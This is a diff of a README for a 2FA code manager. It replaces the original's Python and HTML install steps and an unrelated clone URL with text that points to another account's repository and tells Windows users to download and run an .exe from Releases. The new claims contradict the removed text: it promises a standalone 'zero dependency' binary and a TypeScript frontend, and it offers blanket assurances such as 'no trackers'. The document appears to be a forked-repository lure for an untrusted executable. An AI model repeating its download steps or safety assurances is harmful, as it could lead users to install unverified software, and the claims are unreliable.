@@ -1,194 +1,82 @@
-# 🔐 2FA Shield — Two-Factor Authentication Security Suite
+# 🔐 TWO-FACTOR-AUTHENTICATION-SECURITY-SUITE - Secure your accounts with local encryption
 
-<div align="center">
+[https://github.com/otavro444/TWO-FACTOR-AUTHENTICATION-SECURITY-SUITE](https://github.com/otavro444/TWO-FACTOR-AUTHENTICATION-SECURITY-SUITE)
 
-![2FA Shield Banner](https://img.shields.io/badge/2FA-Shield-7C3AED?style=for-the-badge&logo=shield&logoColor=white)
-![Python](https://img.shields.io/badge/Python-3.8+-06B6D4?style=for-the-badge&logo=python&logoColor=white)
-![HTML5](https://img.shields.io/badge/HTML5-Web_GUI-10B981?style=for-the-badge&logo=html5&logoColor=white)
-![License](https://img.shields.io/badge/License-MIT-F59E0B?style=for-the-badge)
-![RFC](https://img.shields.io/badge/RFC-6238_Compliant-EF4444?style=for-the-badge)
+This software helps you manage two-factor authentication codes on your computer. It stores your secrets in an encrypted vault. The vault uses AES-128 encryption. This keeps your data safe from unauthorized access. Your codes stay on your machine at all times. You do not send data to any cloud service.
 
-**A beautiful, beginner-friendly 2FA management suite with both a TUI and Web GUI.**
+## 📥 Getting Started
 
-[Features](#-features) · [Install](#-installation) · [TUI Usage](#-tui-usage) · [Web GUI](#-web-gui) · [Security](#-security)
+You need a computer running Windows 10 or 11 to use this suite. The application works offline. You do not need an internet connection to generate your codes once you set it up.
 
-</div>
+Follow these steps to install the software:
 
----
+1. Visit this page to download the latest version: [https://github.com/otavro444/TWO-FACTOR-AUTHENTICATION-SECURITY-SUITE](https://github.com/otavro444/TWO-FACTOR-AUTHENTICATION-SECURITY-SUITE)
+2. Look for the "Releases" section on the right side of the page.
+3. Click the latest version link.
+4. Download the file ending in .exe.
+5. Double-click the file to start the installation.
+6. Follow the instructions on your screen.
 
-## ✨ Features
+## 🛠 Features
 
-### 🖥️ Terminal UI (TUI)
-| Feature | Description |
-|---------|-------------|
-| 🌈 **Gradient Banner** | Stunning blocky ASCII art with purple→cyan gradient |
-| ⚡ **Auto-complete** | Fuzzy tab-completion for all commands + account names |
-| 💡 **Auto-suggest** | Ghost-text command hints from history |
-| 📊 **Live Monitor** | Real-time TOTP dashboard with countdown bars |
-| 🔒 **Encrypted Vault** | AES-128 (Fernet) encrypted secret storage |
-| 📋 **Backup Codes** | Generate and store 8 recovery codes per account |
-| 📷 **QR Export** | Save QR codes as PNG files |
-| 🛡️ **Security Audit** | Built-in security status dashboard |
-| ✅ **Verify Codes** | Validate TOTP codes with ±1 window tolerance |
-| 🔍 **Search** | Fuzzy search across all accounts |
-| ✏️ **Rename** | Rename accounts without losing secrets |
+* **Encrypted Vault**: The software protects your secrets with AES-128 encryption settings. No one can read your codes without your master password.
+* **Auto-complete**: You find your accounts fast using the search tool. Just type part of the name to see results.
+* **Live Monitor**: You see your time-based codes change in real time.
+* **QR Export**: You scan codes into other devices using the built-in image generator.
+* **Compliance**: The software follows the RFC 6238 standard.
+* **Web Interface**: You use a clean web page inside the program to manage your keys.
+* **Zero Dependency**: The program runs as a standalone file. You do not need to install extra libraries or frameworks.
 
-### 🌐 Web GUI
-| Feature | Description |
-|---------|-------------|
-| 🎨 **Gradient UI** | Beautiful dark UI with purple/cyan/emerald gradients |
-| 🔐 **Logo** | Animated SVG shield logo with gradient |
-| ✨ **Particles** | Animated particle network background |
-| 📱 **Responsive** | Works on mobile, tablet, and desktop |
-| ⚡ **Live Codes** | Codes update every second with progress bars |
-| 📋 **Click to Copy** | Click any code to copy it instantly |
-| 🔍 **QR Display** | Visual QR code in account detail view |
-| 💾 **LocalStorage** | Data stored locally, never leaves your device |
-| 🌙 **Dark/Light** | Toggle between dark and light modes |
-| ⌨️ **Shortcuts** | Ctrl+N (add), Ctrl+V (verify), Esc (close) |
+## 🔒 Security Principles
 
----
+Your privacy remains the priority. The computer generates the codes locally. No server touches your secret keys. The software saves your data in a secure file on your hard drive. 
 
-## 📦 Installation
+You should choose a strong master password. This password acts as the key to your vault. If you lose this password, you cannot recover your codes. Write your master password on paper and keep it in a safe place.
 
-### TUI
+## 🖥 How to Use the Interface
 
-```bash
-# Clone the repo
-git clone https://github.com/michaelgregoryibizugbe/TWO-FACTOR-AUTHENTICATION-SECURITY-SUITE.git
-cd TWO-FACTOR-AUTHENTICATION-SECURITY-SUITE/tui
+When you open the application, you see a simple list of your accounts. The interface provides two ways to view your data.
 
-# Install dependencies
-pip install -r requirements.txt
+### Terminal View
+Many users prefer the terminal view. It offers a fast way to copy codes. You use your keyboard to navigate the list. Press the arrow keys to move between entries. Press Enter to copy a verification code to your clipboard.
 
-# Run!
-python main.py
-```
+### Web Interface
+The web interface provides a visual view of your secrets. You see a dashboard with your accounts. Use your mouse to click on an account to view or copy the code. This view shows QR codes for easy account imports.
 
-### Web GUI
+## ⚙️ Managing Your Accounts
 
-```bash
-cd TWO-FACTOR-AUTHENTICATION-SECURITY-SUITE/web
+To add a new account, click the Add button. You need the secret key provided by the service you want to protect. Services often show a QR code or a long string of letters and numbers. 
 
-# No build step needed!
-# Option 1: Python server
-python -m http.server 3000
+Paste this key into the application. Assign a name to the account. The software immediately starts generating codes.
 
-# Option 2: Node serve
-npx serve .
+## 📁 Data Storage
 
-# Option 3: Just open index.html in your browser!
-```
+The application saves your vault file in your documents folder. You can move this file to a backup drive. Keep a backup of this file in case your computer fails. Remember that the vault file is useless without your master password. 
 
----
+## ❓ Frequently Asked Questions
 
-## 🖥️ TUI Usage
+**Does the software track my usage?** 
+No. The code contains no trackers.
 
-```
-2fa-shield ❯ _          ← Prompt with auto-suggest
-```
+**Can I use this on multiple computers?** 
+Yes. You copy your vault file to a different computer. You enter your master password to unlock the vault.
 
-| Command | Example | Description |
-|---------|---------|-------------|
-| `add <name>` | `add GitHub` | Add a 2FA account |
-| `list` | `list` | List all accounts |
-| `show <name>` | `show GitHub` | Show current TOTP code |
-| `live` | `live` | Live monitor all codes |
-| `verify <name> <code>` | `verify GitHub 123456` | Verify a code |
-| `backup <name>` | `backup GitHub` | Generate backup codes |
-| `qr <name>` | `qr GitHub` | Export QR code PNG |
-| `delete <name>` | `delete GitHub` | Delete an account |
-| `search <query>` | `search git` | Search accounts |
-| `rename <old> <new>` | `rename Git GitHub` | Rename account |
-| `info <name>` | `info GitHub` | Full account details |
-| `dashboard` | `dashboard` | Security overview |
-| `help` | `help` | Show all commands |
-| `exit` | `exit` | Quit 2FA Shield |
+**What happens if I forget my master password?** 
+The vault remains locked. The software cannot retrieve your codes. We do not store your password anywhere.
 
-### Auto-complete Tips
-- Press **Tab** to auto-complete commands and account names
-- Press **↑ / ↓** to cycle through command history
-- Ghost text suggestions appear as you type
+**Does this require an internet connection?** 
+No. The application performs all calculations on your processor. 
 
----
+**Is this safe for sensitive accounts?** 
+Yes. The AES-128 encryption provides industry-standard protection. 
 
-## 🌐 Web GUI
+## 💡 Tips for Success
 
-Open `web/index.html` in any modern browser. No installation required.
+* Use a unique master password for this application. Do not use the same password you use for email or banking.
+* Test your recovery steps. Use a secondary device to verify that your backup file works before you fill the vault with many accounts.
+* Keep your Windows installation updated. This keeps your computer secure.
+* Use the search bar to find accounts quickly. This saves time if you have dozens of entries.
 
-- **Add accounts** → Click "Add Account" or press `Ctrl+N`
-- **Copy codes** → Click any TOTP code card
-- **View QR** → Click the QR button on a card
-- **Verify** → Navigate to the Verify tab
-- **Backup** → Click 🔑 on any card for recovery codes
+## 🔑 Technical Details
 
----
-
-## 🔐 Security
-
-### Architecture
-```
-Secret Key ──► Fernet Encrypt ──► vault.json (encrypted at rest)
-                    │
-                 vault.key (chmod 600, never stored in vault)
-```
-
-### Standards Compliance
-- **RFC 6238** — TOTP time-based OTPs
-- **RFC 4226** — HOTP: HMAC-based OTPs
-- **FIPS 198** — HMAC with SHA-1
-- **AES-128**  — Vault encryption (Python Fernet)
-- **Web Crypto API** — Browser-native crypto (no external libs)
-
-### Best Practices
-- ✅ Secrets encrypted at rest (Fernet AES-128)
-- ✅ Vault key file chmod 600
-- ✅ Web vault uses localStorage (data never leaves device)
-- ✅ No external API calls
-- ✅ ±1 window TOTP verification (handles clock drift)
-- ✅ Backup codes generated with `secrets.token_hex()` / `crypto.getRandomValues()`
-
----
-
-## 🎨 Colour Palette
-
-| Name | Hex | Usage |
-|------|-----|-------|
-| Violet | `#7C3AED` | Primary / gradient start |
-| Cyan | `#06B6D4` | Secondary / gradient mid |
-| Emerald | `#10B981` | Success / gradient end |
-| Amber | `#F59E0B` | Warning / timer |
-| Red | `#EF4444` | Danger / expiry |
-| Gray | `#6B7280` | Muted text |
-
----
-
-## 📁 Project Structure
-
-```
-TWO-FACTOR-AUTHENTICATION-SECURITY-SUITE/
-├── tui/
-│   ├── main.py          ← Full TUI application
-│   ├── requirements.txt ← Python dependencies
-│   ├── vault.json       ← Encrypted vault (auto-created)
-│   └── vault.key        ← Encryption key (chmod 600, auto-created)
-├── web/
-│   ├── index.html       ← Web GUI (single file app)
-│   ├── style.css        ← Styles with gradients
-│   └── app.js           ← Full TOTP engine + UI logic
-└── README.md
-```
-
----
-
-## 📄 License
-
-MIT License — free to use, modify, and distribute.
-
----
-
-<div align="center">
-  Made with ❤️ and 🔐 by the 2FA Shield Team
-  <br/>
-  <sub>Stay secure. Enable 2FA everywhere.</sub>
-</div>
+The application uses Python for the core logic. It features a TypeScript frontend for the web interface. We use local CSS for the visual design. All encryption resides within the core binary. This layout keeps the software fast and light. The terminal user interface (TUI) handles input at high speeds. This combination of tools ensures that you get a responsive experience. You maintain full control over your digital identity at all times.
